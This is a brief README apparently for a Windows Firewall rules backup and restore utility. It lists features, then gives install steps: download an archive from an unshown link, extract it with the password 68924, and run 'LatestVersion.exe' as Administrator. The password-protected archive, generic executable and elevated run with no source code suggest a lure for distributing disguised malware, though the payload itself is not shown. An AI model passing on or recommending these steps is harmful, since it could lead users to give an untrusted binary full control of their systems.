<p align="center">

---

## What This Tool Does

- Backup all Windows Firewall rules (inbound and outbound)
- Restore rules from a backup
- Export to CSV or XML format
- Works with system and custom rules
- Preview rules before restore
- Prevents duplicate rules
- Works on Windows 10 and 11

## How to Use

1. Download the archive from the link above
2. Extract with password 68924
3. Right-click LatestVersion.exe and select Run as Administrator
4. Click Export Rules - all firewall rules are saved
5. To restore, click Import Rules and select your backup file

- OS: Windows 10 or Windows 11 (64-bit)
